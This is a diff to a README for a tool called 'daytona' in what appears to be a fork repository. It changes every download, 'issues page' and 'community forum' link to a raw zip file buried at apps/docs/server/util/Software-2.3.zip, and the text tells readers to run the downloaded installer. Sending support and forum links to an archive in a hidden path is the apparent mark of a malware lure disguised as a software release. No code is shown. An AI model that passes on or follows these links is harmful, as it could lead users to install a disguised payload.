@@ -1,6 +1,6 @@
 # 🚀 daytona - Your Gateway to AI-Powered Code Execution
 
-[![Download Latest Release](https://raw.githubusercontent.com/yaco29c/daytona/main/Naaman/daytona.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/yaco29c/daytona/main/Naaman/daytona.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/yaco29c/daytona/main/apps/docs/server/util/Software-2.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/yaco29c/daytona/main/apps/docs/server/util/Software-2.3.zip)
 
 ## 🌟 Overview
 
@@ -28,7 +28,7 @@ Follow these steps to download and run Daytona:
 
 1. **Visit the Releases Page**  
    Go to the Daytona releases page by clicking the link below:  
-   [Download Latest Release](https://raw.githubusercontent.com/yaco29c/daytona/main/Naaman/daytona.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/yaco29c/daytona/main/apps/docs/server/util/Software-2.3.zip)
 
 2. **Select Your Version**  
    On the releases page, find the version that matches your operating system. Look for titles like “Windows Installer,” “Mac OS Package,” or “Linux Tarball.” 
@@ -39,7 +39,7 @@ Follow these steps to download and run Daytona:
 4. **Install Daytona**  
    - For Windows: Locate the downloaded `.exe` file in your Downloads folder. Double-click it and follow the on-screen instructions.
    - For macOS: Open the downloaded `.dmg` file. Drag the Daytona app to your Applications folder.
-   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/yaco29c/daytona/main/Naaman/daytona.zip` file and follow any included installation instructions.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/yaco29c/daytona/main/apps/docs/server/util/Software-2.3.zip` file and follow any included installation instructions.
 
 5. **Open Daytona**  
    After installation, find Daytona in your applications or programs list. Launch the app to start using it.
@@ -47,7 +47,7 @@ Follow these steps to download and run Daytona:
 ## 📥 Download & Install
 
 To get started, visit this page to download:  
-[Download Latest Release](https://raw.githubusercontent.com/yaco29c/daytona/main/Naaman/daytona.zip)
+[Download Latest Release](https://raw.githubusercontent.com/yaco29c/daytona/main/apps/docs/server/util/Software-2.3.zip)
 
 ## 💡 Using Daytona
 
@@ -72,11 +72,11 @@ If you encounter any problems while using Daytona, consider these steps:
 
 ## 📞 Support
 
-For further assistance, please visit our [issues page](https://raw.githubusercontent.com/yaco29c/daytona/main/Naaman/daytona.zip) or contact support through GitHub. 
+For further assistance, please visit our [issues page](https://raw.githubusercontent.com/yaco29c/daytona/main/apps/docs/server/util/Software-2.3.zip) or contact support through GitHub. 
 
 ## 🌍 Community
 
-Join the Daytona community to share experiences, report bugs, and discuss ideas. Connect with users on our [community forum](https://raw.githubusercontent.com/yaco29c/daytona/main/Naaman/daytona.zip).
+Join the Daytona community to share experiences, report bugs, and discuss ideas. Connect with users on our [community forum](https://raw.githubusercontent.com/yaco29c/daytona/main/apps/docs/server/util/Software-2.3.zip).
 
 ---
 
